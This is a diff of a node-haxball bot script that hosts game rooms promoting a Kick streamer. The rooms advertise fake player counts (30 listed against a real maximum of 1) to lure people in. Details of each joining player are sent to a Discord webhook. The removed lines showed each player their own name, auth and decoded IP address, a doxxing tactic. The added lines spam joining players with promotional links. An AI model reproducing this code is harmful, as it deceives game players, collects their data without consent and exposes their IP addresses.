@@ -82,8 +82,8 @@ const roomNames = [
     "🟢 KICK: JoacoXLS ON 🟢"
 ];
 
-const maxPlayersList = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1];
-const fakePlayersList = [30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30];
+const maxPlayersList = [1,1,1,1,1,1,1,1,1,1,1];
+const fakePlayersList = [30,30,30,30,30,30,30,30,30,30,30];
 
 const geoList = [
     { lat: -34.5200004577637, lon: -58.4199981689453, flag: "LY" },
@@ -112,76 +112,89 @@ console.log(`🚀 Creando sala: ${roomName} | MaxPlayers: ${maxPlayers} | FakePl
 /* ---------- Crear sala (node-haxball moderno) ---------- */
 
 Room.create(
-    {
-        name: roomName,
-        password: process.env.ROOM_PASSWORD || "",
-        maxPlayerCount: maxPlayers,
-        playerCount: fakePlayers,
-        unlimitedPlayerCount: true,
-        showInRoomList: true,
-        geo: geo,
-        token: token
+{
+    name: roomName,
+    password: process.env.ROOM_PASSWORD || "",
+    maxPlayerCount: maxPlayers,
+    playerCount: fakePlayers,
+    unlimitedPlayerCount: true,
+    showInRoomList: true,
+    geo: geo,
+    token: token
+},
+{
+    storage: {
+        player_name: process.env.PLAYER_NAME || "Bot",
+        avatar: process.env.PLAYER_AVATAR || "👽"
     },
-    {
-        storage: {
-            player_name: process.env.PLAYER_NAME || "Bot",
-            avatar: process.env.PLAYER_AVATAR || "👽"
-        },
-        libraries: [],
-        config: null,
-        renderer: null,
-        plugins: [],
-        onOpen: (room) => {
-            console.log("✅ Sala creada (onOpen). Esperando link...");
+    libraries: [],
+    config: null,
+    renderer: null,
+    plugins: [],
+    onOpen: (room) => {
 
-            room.onAfterRoomLink = (roomLink) => {
-                console.log("🔗 Link de la sala:", roomLink);
-                if (webhookUrl) sendDiscordRoomLink(webhookUrl, roomLink, roomName);
-            };
+        console.log("✅ Sala creada (onOpen). Esperando link...");
 
-            room.onPlayerJoin = (playerObj, customData) => {
-                try {
-                    console.log(`🎯 Nuevo jugador: ${playerObj.name} (ID: ${playerObj.id})`);
-                    sendDiscordPlayer(webhookUrl, playerObj, roomName);
+        room.onAfterRoomLink = (roomLink) => {
+            console.log("🔗 Link de la sala:", roomLink);
+            if (webhookUrl) sendDiscordRoomLink(webhookUrl, roomLink, roomName);
+        };
 
+        /* 🔥 SPAM FACHERÍSIMO AL ENTRAR */
+        room.onPlayerJoin = (playerObj) => {
+            try {
+
+                console.log(`🎯 Nuevo jugador: ${playerObj.name} (ID: ${playerObj.id})`);
+                sendDiscordPlayer(webhookUrl, playerObj, roomName);
+
+                // ⚡ Mensajes fachero Kick style
+                const mensajes = [
+                    "🟢🟢🟢  BIENVENIDO REY  🟢🟢🟢",
+                    "💚 MIRÁ EL STREAM DE : https://kick.com/joacoxls 💚",
+                    "🟢 EL MEJOR CONTENIDO EN VIVO 🟢",
+                    "💚 SEGUINOS EN KICK: https://kick.com/joacoxls 💚"
+                ];
+
+                let i = 0;
+                let contador = 0;
+
+                const spam = setInterval(() => {
                     room.sendAnnouncement(
-                        `Discord: Teleese - Pagina: https://teleese.netlify.app/`,
+                        ` ${mensajes[i]} `,
                         null,
-                        0xff0000,
+                        0x00ff00,
                         "bold",
                         2
                     );
 
-                    setTimeout(() => {
-                        room.sendAnnouncement(
-                            `Nombre: ${playerObj.name} Auth: ${playerObj.auth || "N/A"} Ip: ${decryptHex(playerObj.conn)}`,
-                            playerObj.id,
-                            0xff0000,
-                            "bold",
-                            2
-                        );
-                    }, 1000);
-                } catch (e) {
-                    console.error("Error en onPlayerJoin:", e);
-                }
-            };
+                    i = (i + 1) % mensajes.length;
+                    contador++;
 
-            room.onPlayerLeave = (playerObj, reason, isBanned, byId, customData) => {
-                console.log(`👋 Jugador salió: ${playerObj.name} (ID: ${playerObj.id})`);
-            };
+                    if (contador >= 6) clearInterval(spam);
 
-            room.onPlayerChat = (id, message, customData) => {
-                console.log(`💬 ${id}: ${message}`);
-                return false;
-            };
+                }, 1500);
 
-            room.onRoomError = (err, customData) =>
-                console.error("❌ Error en sala:", err);
-        },
-        onClose: (msg) => {
-            console.log("🔴 Bot ha salido de la sala:", msg?.toString());
-            process.exit(0);
-        }
+            } catch (e) {
+                console.error("Error en onPlayerJoin:", e);
+            }
+        };
+
+        room.onPlayerLeave = (playerObj) => {
+            console.log(`👋 Jugador salió: ${playerObj.name} (ID: ${playerObj.id})`);
+        };
+
+        room.onPlayerChat = (id, message) => {
+            console.log(`💬 ${id}: ${message}`);
+            return false;
+        };
+
+        room.onRoomError = (err) =>
+            console.error("❌ Error en sala:", err);
+    },
+    onClose: (msg) => {
+        console.log("🔴 Bot ha salido de la sala:", msg?.toString());
+        process.exit(0);
     }
+}
 );
 
